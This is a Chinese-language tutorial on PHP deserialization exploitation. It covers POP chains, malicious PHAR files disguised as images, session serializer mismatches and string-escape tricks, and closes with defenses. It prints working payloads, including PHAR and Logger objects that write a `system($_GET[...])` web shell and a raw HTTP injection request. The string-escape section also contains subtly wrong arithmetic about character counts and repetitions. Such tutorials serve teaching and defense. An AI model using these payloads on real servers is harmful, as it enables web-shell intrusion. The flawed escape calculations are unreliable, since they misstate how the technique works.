# PHP Deserialization

> **参考：** [SSTI](../Server-Side%20Template%20Injection%20(SSTI)/Server-Side%20Template%20Injection%20(SSTI).md) | [XXE](../XML%20External%20Entity%20(XXE)/XML%20External%20Entity%20(XXE).md)

---

## 什么是 PHP 反序列化？

PHP 反序列化（Deserialization）是将存储或传输中的序列化字符串转换回 PHP 变量（包括对象）的过程。当应用程序对用户可控的数据进行反序列化操作时，攻击者可以通过构造恶意的序列化字符串来操纵对象属性，并利用已有类中的魔术方法（Magic Methods）执行任意操作。

**核心漏洞在于：** `unserialize()` 函数接受用户可控的输入时，攻击者可以控制反序列化对象的属性值，并触发对象中的魔术方法。

---

## PHP 魔术方法（Magic Methods）

魔术方法是 PHP 中以 `__` 开头的特殊方法，在特定时机被自动调用。在反序列化漏洞利用中，以下魔术方法是攻击的关键入口：

### 构造与析构

| 方法 | 触发时机 |
|------|---------|
| `__construct()` | 创建对象时调用 |
| `__destruct()` | 对象被销毁或所有引用被删除时调用 |

### 序列化相关

| 方法 | 触发时机 |
|------|---------|
| `__sleep()` | 执行 `serialize()` 时先调用，返回需要序列化的属性名数组 |
| `__wakeup()` | 执行 `unserialize()` 时调用，用于重建对象状态 |

### 属性访问相关

| 方法 | 触发时机 |
|------|---------|
| `__get($name)` | 访问不可访问（不存在或不可见）的成员变量时调用 |
| `__set($name, $value)` | 设置不可访问的成员变量时调用 |
| `__isset($name)` | 对不可访问属性调用 `isset()` 或 `empty()` 时调用 |
| `__unset($name)` | 对不可访问属性调用 `unset()` 时调用 |

### 方法调用相关

| 方法 | 触发时机 |
|------|---------|
| `__call($name, $arguments)` | 调用不可访问（不存在或不可见）的方法时调用 |
| `__callStatic($name, $arguments)` | 静态方式调用不可访问方法时调用 |

### 对象表示相关

| 方法 | 触发时机 |
|------|---------|
| `__toString()` | 对象被当作字符串使用时调用（如 `echo`、字符串拼接） |
| `__invoke()` | 以调用函数的方式调用对象时触发（如 `$obj()`） |

### 其他

| 方法 | 触发时机 |
|------|---------|
| `__clone()` | 对象复制完成时调用 |
| `__debugInfo()` | 使用 `var_dump()` 时调用 |

---

## POP 链（Property-Oriented Programming）

### 什么是 POP 链？

POP 链是一种利用代码中已存在的类和魔术方法，通过控制对象的属性连接一系列代码片段（Gadgets），最终达到恶意目的的攻击技术。

在实际漏洞利用中，危险函数很少直接出现在 `__destruct()` 或 `__wakeup()` 中。更常见的情况是：危险函数藏在某个普通类方法里，需要通过多次对象属性跳转才能触发。

### POP 链的核心要素

一条 POP 链由三部分组成：

1. **入口点（Entry Point）**：自动调用的魔术方法，如 `__destruct()`、`__wakeup()`。这是反序列化后攻击的起点。
2. **中间跳板（Middle Gadgets）**：利用 `__toString()`、`__call()`、`__get()` 等方法，将执行流从入口点一步步传递到最终目标。
3. **最终目标（Sink）**：执行危险操作的地方，如 `system()`、`file_put_contents()`、`include()` 等。

### POP 链示例

以下通过一个完整的例子说明 POP 链的构造过程。

**漏洞代码：**

```php
// flag is in flag.php
class Modifier {
    private $var;
    public function append($value) {
        include($value);
        echo $flag;
    }
    public function __invoke() {
        $this->append($this->var);
    }
}

class Show {
    public $source;
    public $str;
    public function __toString() {
        return $this->str->source;
    }
    public function __wakeup() {
        echo $this->source;
    }
}

class Test {
    public $p;
    public function __get($key) {
        $function = $this->p;
        return $function();
    }
}

if (isset($_GET['pop'])) {
    unserialize($_GET['pop']);
}
```

**攻击链分析：**

```
unserialize() 触发 Show::__wakeup()
    -> echo $this->source (source 设为 Show 对象自身)
    -> 触发 Show::__toString()
    -> return $this->str->source (str 设为 Test 对象)
    -> Test 无 source 属性，触发 Test::__get()
    -> $function = $this->p; return $function() (p 设为 Modifier 对象)
    -> 以函数方式调用 Modifier 对象，触发 Modifier::__invoke()
    -> $this->append($this->var) (var 设为 'flag.php')
    -> include('flag.php') -- 攻击成功
```

**构造 Payload：**

```php
$modi = new Modifier();
// 通过反射设置 private 属性 $var = 'flag.php'

$show = new Show();
$test = new Test();

$show->source = $show;   // __wakeup() -> echo 触发 __toString()
$show->str = $test;      // __toString() 访问 $test->source 触发 __get()
$test->p = $modi;        // __get() 将 $modi 当作函数调用，触发 __invoke()

$payload = serialize($show);
echo urlencode($payload);
```

### POP 链的本质

- POP 链的本质是"借刀杀人" -- 利用程序自身的代码逻辑达到攻击目的
- 攻击者需要像侦探一样在源代码中寻找所有可能的 Gadgets（魔术方法、普通方法、属性），并思考如何通过控制属性将它们连接成有效链条
- 挖掘 POP 链通常需要源代码（白盒测试）或对常见框架/库的代码非常熟悉

---

## PHAR 反序列化

### 什么是 PHAR？

PHAR（PHP Archive）类似于 Java 的 JAR 文件，将多个 PHP 文件打包成一个单独的文件。一个 PHAR 文件包含四部分：

1. **Stub**：可执行的 PHP 代码片段，用于引导（必须包含 `__HALT_COMPILER();`）
2. **Manifest**：包含文件的元信息，其中有一个 **`metadata`** 字段可存储任何可序列化的 PHP 变量
3. **File Contents**：实际的文件内容
4. **Signature**（可选）：验证完整性的签名

### 漏洞原理

当 PHP 使用 `phar://` 流包装器操作一个 PHAR 文件时（如 `file_exists()`、`fopen()`、`file_get_contents()`、`unlink()` 等），PHAR 扩展会**自动反序列化其 `metadata` 区域存储的数据**。

**关键风险点：**

- 很多文件操作函数都支持流包装器，开发者通常认为 `file_exists('uploads/user.jpg')` 是安全的
- 即使文件扩展名不是 `.phar`（如 `.jpg`、`.txt`），只要文件内容符合 PHAR 格式，PHP 仍将其识别为 PHAR 文件
- 攻击者可以将恶意 PHAR 文件伪装成图片上传，再通过 `phar://` 协议触发反序列化

### 利用条件

1. 攻击者能够将 PHAR 文件上传到服务器
2. 服务器上存在可被利用的类（POP 链）
3. 存在一个以 `phar://` 协议触发文件操作的入口点，且路径用户可控

### 攻击步骤

**第 1 步：制作恶意 PHAR 文件**

```php
<?php
class VulnerableClass {
    public $cmd = 'whoami';
    public function __destruct() {
        system($this->cmd);
    }
}

@unlink('evil.phar');
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$payload = new VulnerableClass();
$payload->cmd = "echo '<?php system($_GET[\"c\"]); ?>' > shell.php";
$phar->setMetadata($payload);
$phar->addFromString('test.txt', 'text');
$phar->stopBuffering();
```

> **生成 PHAR 的注意事项：** 需要在 `php.ini` 中设置 `phar.readonly = Off`，或在命令行中指定 `php -d phar.readonly=0 create_phar.php`。

**第 2 步：绕过上传限制**

将 `evil.phar` 重命名为 `evil.jpg`，绕过扩展名白名单检查后上传。

**第 3 步：触发反序列化**

访问可控的文件操作入口点：

```
http://target.com/profile.php?avatar_path=phar://uploads/evil.jpg/test.txt
```

当 `file_exists('phar://uploads/evil.jpg/test.txt')` 执行时，PHAR 扩展解析文件并反序列化 metadata 中的恶意对象，触发 `__destruct()` 执行命令。

### PHAR 文件结构类比

把 PHAR 文件想象成一个 ZIP 压缩包：`evil.jpg` 是整个 PHAR 文件（如 `archive.zip`），`test.txt` 是压缩包内的一个具体文件。`phar://evil.jpg/test.txt` 表示访问 PHAR 归档内的 `test.txt` 文件。

---

## Session 反序列化

### 漏洞原理

PHP 在序列化和反序列化 Session 数据时，如果使用了**不同的处理器（handler）**，并且攻击者能够控制 Session 数据的内容，就可能触发对象注入。

### PHP Session 处理器

PHP 通过 `session.serialize_handler` 定义序列化 Session 数据的处理器：

| 处理器 | 格式示例 | 说明 |
|--------|---------|------|
| `php` | `username\|s:5:"alice";role\|s:4:"user";` | 默认处理器，键值对格式 |
| `php_binary` | 二进制格式 | 类似 `php` 但使用二进制长度前缀 |
| `php_serialize` | `a:2:{s:8:"username";s:5:"alice";...}` | 使用标准 `serialize()` 格式 |

### 攻击场景：`php_serialize` 写入 + `php` 读取

当两个应用使用不同的处理器时产生解析差异：

1. 应用 A（如文件上传页面）使用 `php_serialize` 处理器写入 Session
2. 应用 B（如主页）使用默认 `php` 处理器读取 Session
3. 攻击者向应用 A 注入恶意序列化字符串，写入 Session 文件
4. 应用 B 读取 Session 时，`php` 处理器对键名进行反序列化，触发恶意对象创建

### 攻击流程详解

**步骤 1：构造恶意序列化字符串**

假设存在漏洞类：

```php
class Logger {
    private $log_file;
    private $log_data;
    public function __wakeup() {
        file_put_contents($this->log_file, $this->log_data, FILE_APPEND);
    }
}
```

生成 payload：

```php
$logger = new Logger();
// 设置 private 属性 log_file = './shell.php', log_data = '<?php system($_GET["cmd"]); ?>'
echo serialize($logger);
```

**步骤 2：注入到 Session**

攻击者向使用 `php_serialize` 处理器的页面发送请求，将恶意数据存入 Session。关键是在 payload 前添加竖线 `|`：

```
POST /upload.php HTTP/1.1
Cookie: PHPSESSID=hackedsession

data=|O:6:"Logger":2:{s:15:"...log_file";s:11:"./shell.php";s:15:"...log_data";s:29:"<?php system($_GET['cmd']); ?>";}
```

竖直 `|` 是攻击成功的关键。`php_serialize` 处理器将整个 Session 数组序列化后写入文件。由于 user_upload_data 的值以 `|` 开头，最终 Session 文件内容为：

```
user_upload_data|s:XX:"|恶意序列化字符串...";
```

**步骤 3：触发反序列化**

用户访问使用 `php` 处理器的应用 B 时：

1. `php` 处理器解析 Session 文件，以 `|` 为分隔符
2. `|` 之前的内容被视为键名，`php` 处理器会对键名进行反序列化操作
3. 恶意序列化字符串被反序列化，创建 `Logger` 对象
4. `__wakeup()` 被触发，`file_put_contents()` 写入 Web Shell

---

## 字符串逃逸

### 反序列化成功的基本条件

一个序列化字符串要成功反序列化，必须满足：

- 类中属性数量正确（如 `O:1:"A":2:` 中的 `2`）
- 每个属性的长度及值的长度正确
- 即使存在不存在的属性，只要属性数量和长度正确，反序列化仍可成功

```
O:1:"A":2:{s:2:"v1";s:5:"hello";s:2:"v2";s:3:"123";}
```

### 减少型逃逸（字符被过滤减少）

当服务器端对用户输入中的某些字符进行过滤删除（如 `str_replace("system()", "", $data)`）时，如果过滤导致字符串实际长度小于声明的长度，序列化解析器会继续向后读取额外字符，从而"吞噬"原本不属于该属性的内容。

**攻击原理：**

```
原始序列化：
O:1:"A":2:{s:2:"v1";s:19:"abcsystem()system()";s:2:"v2";s:3:"123";}

过滤 system() 后：
O:1:"A":2:{s:2:"v1";s:19:"abc";s:2:"v2";s:3:"123";}

s:19 声明长度为 19，但实际只有 "abc" + 后续被吞噬的内容
解析器向前读取 19 个字符：abc";s:2:"v2";s:3:"
这导致 v2 及其值被"吞噬"到 v1 中
```

**利用方式：** 在 v2 的位置预先填入要逃逸出的新属性。例如，将 v2 的值设为 `;s:2:"v3";s:3:"wjj";}`，则过滤后逃逸出一个新的 `v3` 属性：

```php
class A {
    public $v1 = "abcsystem()system()";  // 7 个 system() = 7*7 char 减少 = 49 char
    public $v2 = ';s:2:"v3";s:3:"wjj";}';
}
```

### 增多型逃逸（字符被替换增多）

当服务器端对用户输入进行字符替换导致长度增加时（如 `str_replace("ls", "pwd", $data)`，"ls"(2字符) 变成 "pwd"(3字符)），实际长度超出声明长度导致反序列化失败。但可以利用这个长度差来逃逸。

**攻击原理：**

```
原始：O:1:"A":2:{s:2:"v1";s:2:"ls";s:2:"v2";s:3:"123";}
替换后：O:1:"A":2:{s:2:"v1";s:2:"pwd";s:2:"v2";s:3:"123";}
```

声明长度 2 但实际是 3 字符 "pwd"，反序列化失败。

**利用方式：** 每个 "ls" 替换为 "pwd" 多出 1 个字符。如果要逃逸的内容长度为 22 个字符，则需要 44 个 "ls"（替换后多出 44 个字符，加上原 payload 的 22 个字符 = 66 个字符）。payload 放在 v1 值的前半部分闭合引用后，被逃逸的部分会被独立解析：

```php
class A {
    public $v1 = 'lslsls...lsls";s:2:"v3";s:3:"wjj";}';  // 44 个 ls + 逃逸 payload
    public $v2 = '123';
}
// str_replace("ls", "pwd", $data) 后，v3 逃逸成功
```

---

## 防御方案

1. **避免反序列化不可信数据：** 这是最根本的防御。使用 `json_encode()` / `json_decode()` 替代 `serialize()` / `unserialize()`
2. **不要在魔术方法中包含敏感操作：** 避免在 `__destruct()`、`__wakeup()`、`__toString()` 等自动调用的方法中执行文件操作、命令执行等危险行为
3. **对 PHAR 文件操作进行限制：** 检查文件路径是否包含 `phar://` 协议前缀，或在 `php.ini` 中禁用 `phar` 流包装器
4. **统一 Session 序列化处理器：** 确保所有应用使用相同的 `session.serialize_handler`，推荐使用 `php_serialize`
5. **输入验证：** 对用户输入进行严格的类型和格式验证，限制可接受的数据格式
